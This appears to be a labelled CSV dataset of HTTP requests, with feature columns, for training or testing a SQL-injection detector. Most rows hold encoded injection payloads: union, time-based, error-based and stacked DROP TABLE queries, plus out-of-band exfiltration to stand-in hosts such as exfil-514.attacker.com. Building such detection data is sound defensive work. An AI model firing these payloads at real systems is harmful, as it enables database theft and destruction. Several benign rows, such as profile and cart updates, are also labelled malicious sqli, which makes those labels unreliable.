RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125.1.63.162",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user5@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,358,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,file=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+user%28%29%2C+NULL%2C+NULL--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,343,21,82,0,1,59,21,9,0,0.2039,2,32,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%2BAND%2B%2528SELECT%2BLOAD_FILE%2528CONCAT%2528%2527%255C%255C%2527%252C%2528SELECT%2Bdatabase%2528%2529%2529%252C%2527.exfil-256.attacker.com%255Cabc%2527%2529%2529%2529%252F%252A,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,381,21,191,0,1,134,33,26,22,0.1557,5,42,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+version%28%29%2C+NULL--,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,317,21,73,0,1,50,17,7,0,0.1809,2,34,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%27+AND+78%3D8+AND+WAITFOR+DELAY+%270%3A0%3A6%27--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,252,21,55,0,1,38,15,6,0,0.1974,0,35,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/7,id=%2527%2520%2561%256e%2564%2520%2536%2537%253d%2538%2532%2520%2541%254e%2544%2520%2577%2541%2549%2554%2566%256f%2572%2520%2544%2545%254c%2561%2579%2520%2527%2530%253a%2530%253a%2533%2527%2523,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,425,16,193,0,1,114,41,38,38,0.1962,0,25,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%2BaND%2B%2528selEct%2BlOAD_fiLE%2528conCat%2528%2527%255c%255C%2527%252c%2528SeLeCT%2BdAtABASE%2528%2529%2529%252c%2527.exFIl-233.aTTAckeR.COm%255CaBc%2527%2529%2529%2529%252F%252a,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,388,21,191,0,1,134,33,26,22,0.1557,5,43,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%2527%2BAND%2B%2528SELECT%2BUPDATEXML%25281%252CCONCAT%25280x7e%252C%2528database%2528%2529%2529%252C0x7e%2529%2529%2529--,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,366,21,129,0,1,88,20,17,14,0.1333,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%2527%2520%2541%254e%2544%2520%2555%2554%254c%255f%2548%2554%2554%2550%252e%2552%2545%2551%2555%2545%2553%2554%2528%2527%2568%2574%2574%2570%253a%252f%252f%2565%2578%2566%2569%256c%252d%2535%2539%2537%252e%2561%2574%2574%2561%2563%256b%2565%2572%252e%2563%256f%256d%252f%2527%257c%257c%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%2529%252f%252a,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,613,21,356,0,1,210,73,70,70,0.1936,0,28,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/2,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,303,16,98,0,1,63,22,16,0,0.193,2,37,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28current_user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,292,21,102,0,1,64,23,16,0,0.187,2,40,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user3@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,311,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,search=%27+AND+%27l%27%3D%27l%27+AND+SLEEP%284%29%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,252,21,55,0,1,28,17,10,0,0.2237,2,30,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+database%28%29%2C+NULL--,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,284,21,75,0,1,57,19,8,0,0.1979,2,31,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/13,,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,273,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,id=%2527%2BAND%2B%2528SELECT%2BLOAD_FILE%2528CONCAT%2528%2527%255C%255C%2527%252C%2528SELECT%2Bversion%2528%2529%2529%252C%2527.exfil-370.attacker.com%255Cabc%2527%2529%2529%2529%2B,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,377,21,181,0,1,128,32,25,20,0.1584,5,45,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%2BAND%2BUTL_HTTP.REQUEST%2528%2527http%253A%252F%252Fexfil-839.attacker.com%252F%2527%257C%257Cversion%2528%2529%2529%2B,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,341,21,131,0,1,94,23,16,13,0.1513,0,46,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/9,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,sqli,330,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user3@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,299,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,file=%27+AnD+%27E%27%3D%27E%27+anD+waitfoR+DElAY+%270%3A0%3A3%27%2F%2A,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,320,21,70,0,1,41,21,12,0,0.2308,0,30,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%2527%2520%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554%2520%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252f%252a,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,410,21,200,0,1,117,42,39,39,0.19,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user4@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,353,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,term=%2527%2BAND%2B%2528SELECT%2BLOAD_FILE%2528CONCAT%2528%2527%255C%255C%2527%252C%2528SELECT%2Bdatabase%2528%2529%2529%252C%2527.exfil-501.attacker.com%255Cabc%2527%2529%2529%2529%2523,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,376,21,186,0,1,131,32,25,21,0.1546,5,44,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+database%28%29%2C+NULL%2C+NULL%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,281,21,84,0,1,62,22,10,0,0.2095,2,31,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%2527%2BAND%2BTRUE%2BAND%2BSLEEP%25286%2529%2523,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,290,21,53,0,1,32,11,8,4,0.1486,2,35,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/5,id=%2527%2520%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554%2520%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%2520,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,575,16,343,0,1,204,71,68,68,0.1978,0,24,False,False,False,True,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/11,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,262,18,0,0,0,0,4,0,0,0.2222,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/6,id=%2527%253B%2BINSERT%2BINTO%2Bproducts%2B%2528email%2529%2BVALUES%2B%2528%2527fuzz_test_590%2527%2529%253B%2B,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,303,16,111,0,1,76,21,16,9,0.1654,1,39,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,355,21,94,0,1,62,21,15,0,0.1826,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,curl/8.6.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user4@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,238,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,category=%27+AND+45%3D88+AND+SLEEP%286%29%2F%2A,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,253,21,47,0,1,26,13,6,0,0.1912,2,33,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,317,16,95,0,1,62,21,15,0,0.1892,2,37,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%2527%2520%2555%256e%2549%254f%256e%2520%2573%2545%254c%2565%2563%2554%2520%254e%2555%256c%254c%252c%2520%2575%2573%2545%2552%2528%2529%252c%2520%256e%2575%256c%256c%252c%2520%256e%2575%254c%254c%252c%2520%256e%2575%256c%254c%252c%2520%254e%2575%254c%256c%252c%2520%254e%2575%256c%256c%2523,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,493,21,296,0,1,174,61,58,58,0.1924,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-514.attacker.com%2F%27%7C%7Cuser%28%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,305,21,101,0,1,66,24,15,0,0.1967,0,46,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3' aND trUe anD sLeEP(6),,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,269,39,0,0,0,0,6,0,0,0.1538,2,24,False,False,False,False,3,False,False,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+UNION+SELECT+version%28%29%2C+NULL+,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,254,21,44,0,1,31,12,4,0,0.1846,2,31,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%2527%2BAnD%2B78%253d58%2BAnD%2BwaItfoR%2BdElaY%2B%25270%253A0%253a4%2527%2B,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,220,21,83,0,1,50,16,13,6,0.1538,0,32,False,False,False,False,3,True,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/8,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,261,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,345,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,file=%27+AND+TRUE+AND+WAITFOR+DELAY+%270%3A0%3A6%27+,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,279,21,52,0,1,37,15,5,0,0.2055,0,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user5@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,345,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
PUT,/rest/cart/item/12,,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,200,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,id=%27+AND+86%3D16+AND+SLEEP%287%29%23,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,247,21,38,0,1,25,12,5,0,0.2034,2,30,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/14,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,307,18,0,15,1,0,9,0,0,0.2727,0,20,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,data=%27+AnD+%28SELECT+updATexML%281%2CconCAt%280x7E%2C%28DATaBAsE%28%29%29%2C0X7E%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,324,21,97,0,1,60,22,16,0,0.1864,2,34,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/10,id=%27+AND+66%3D83+AND+WAITFOR+DELAY+%270%3A0%3A3%27%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,251,17,58,0,1,39,17,8,0,0.2267,0,33,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/7' AND TRUE AND SLEEP(7)/*,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,288,41,0,0,0,0,8,0,0,0.1951,2,26,False,False,False,False,4,False,False,False,False,4,20,Tuesday
GET,/rest/products/7,id=%27+AND+TRUE+AND+SLEEP%287%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,294,16,38,0,1,25,12,5,0,0.2222,2,29,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%27+OR+TRUE%2F%2A,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,272,21,22,0,1,11,8,3,0,0.186,0,27,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%27%3B+DROP+TABLE+products%3B+,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,238,16,33,0,1,24,10,3,0,0.2041,1,27,False,False,False,True,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/11,,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,155,18,0,0,0,0,4,0,0,0.2222,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
PUT,/rest/cart/item/20,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,sqli,306,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,311,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,query=%27+AND+15%3D73+AND+WAITFOR+DELAY+%270%3A0%3A4%27+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,253,21,56,0,1,38,16,6,0,0.2078,0,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,312,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
PUT,/rest/cart/item/17,,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,259,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,term=%27+AND+58%3D20+AND+WAITFOR+DELAY+%270%3A0%3A6%27%23,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,294,21,57,0,1,38,16,7,0,0.2051,0,35,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3' AND TrUe AND sleEP(6)/*,,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,237,41,0,0,0,0,8,0,0,0.1951,2,25,False,False,False,False,4,False,False,False,False,4,20,Tuesday
GET,/rest/products/5,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,343,16,94,0,1,59,22,16,0,0.2,2,38,False,False,False,True,3,False,True,False,False,4,20,Tuesday
